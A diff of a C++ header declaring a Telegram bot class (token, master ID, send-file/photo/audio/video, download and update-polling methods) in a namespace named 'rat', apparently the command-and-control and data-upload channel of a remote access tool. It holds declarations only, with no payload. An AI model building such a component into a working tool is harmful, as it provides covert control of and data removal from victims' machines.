@@ -1,53 +1,69 @@
 #pragma once
 
 #include <limits>
+#include <array>
+#include <string>
+#include <filesystem>
+#include <cstdint>
+
 #include <nlohmann/json.hpp>
-#include "rat/tbot/macros.hpp"
+
 #include "rat/networking.hpp"
 #include "rat/tbot/types.hpp"
-#include "rat/tbot/aliases.hpp"
 
+#define KB 1024
 
+#define TELEGRAM_BOT_API_MESSAGE_RESPONSE_BUFFER_SIZE      (4 * KB)
+#define TELEGRAM_BOT_API_FILE_OPERATION_RESPONSE_BUFFER_SIZE (8 * KB)
+#define TELEGRAM_BOT_API_UPDATE_BUFFER_SIZE                (64 * KB)
+
+#define TELEGRAM_BOT_API_BASE_URL "https://api.telegram.org/bot"
+#define TELEGRAM_API_URL          "https://api.telegram.org"
 
 namespace rat::tbot {
 
-
-using json = nlohmann::json;
-
-
+using MessageResponseBuffer       = std::array<char, TELEGRAM_BOT_API_MESSAGE_RESPONSE_BUFFER_SIZE>;
+using FileOperationResponseBuffer = std::array<char, TELEGRAM_BOT_API_FILE_OPERATION_RESPONSE_BUFFER_SIZE>;
+using UpdateBuffer                = std::array<char, TELEGRAM_BOT_API_UPDATE_BUFFER_SIZE>;
+using json                        = nlohmann::json;
 
 class Bot {
-    private:
-        std::string token;
-        int64_t master_id;
-        int64_t last_update_id ;
-        uint16_t update_interval;
+private:
+    std::string token;
+    int64_t master_id;
+    int64_t last_update_id;
+    uint16_t update_interval;
 
-        std::string sending_message_url_base;
-        std::string sending_document_url;
-        
-        std::string sending_photo_url;
-        std::string getting_file_url;
-        std::string getting_update_url;
-    public:
-        Bot(const std::string& arg_Token, int64_t Master_Id);
-        std::string getToken(void) const;
- 
-        void setOffset(void); //invoke it only if the bot handles the updates, if it is a sender bot do not;
-        int64_t getMasterId(void) const;
+
+    std::string sending_message_url_base;
+    std::string sending_document_url;
+    std::string sending_photo_url;
+    std::string getting_file_url;
+    std::string getting_update_url;
+
+public:
+    /*This is because the bot gets copied inside certain threads, use its client to limit creating another handler*/
+
+    rat::networking::Client curl_client;
+    Bot(const std::string& arg_Token, int64_t Master_Id);
     
-        int64_t getLastUpdateId(void) const;
-        void setUpdateIterval(uint16_t Update_Interval);
-        BotResponse sendMessage(const std::string& Text_Message) const;
-        BotResponse sendFile(const std::filesystem::path& File_Path) const;
+    Bot(const Bot& other);// constructs new Client with its own CURL handle
+    
+    std::string getToken() const;
+    int64_t getMasterId() const;
+    int64_t getLastUpdateId() const;
+    void setUpdateIterval(uint16_t Update_Interval);
+    void setOffset(); // only for bots handling updates, not for sender-only bots
 
-        BotResponse sendPhoto(const std::filesystem::path& Photo_Path) const;
-        BotResponse sendAudio(const std::filesystem::path& Audio_Path);
-        BotResponse sendVideo(const std::filesystem::path& Video_Path);
+    BotResponse sendMessage(const std::string& Text_Message) ;
+    BotResponse sendFile(const std::filesystem::path& File_Path) ;
+    BotResponse sendPhoto(const std::filesystem::path& Photo_Path) ;
+    BotResponse sendAudio(const std::filesystem::path& Audio_Path);
+    BotResponse sendVideo(const std::filesystem::path& Video_Path);
 
-        
-        bool downloadFile(const std::string& File_Id, const std::filesystem::path& Out_Path) const;
-        Update getUpdate();
+    bool downloadFile(const std::string& File_Id, const std::filesystem::path& Out_Path);
+    Update getUpdate();
 };
 
 } // namespace rat::tbot
+
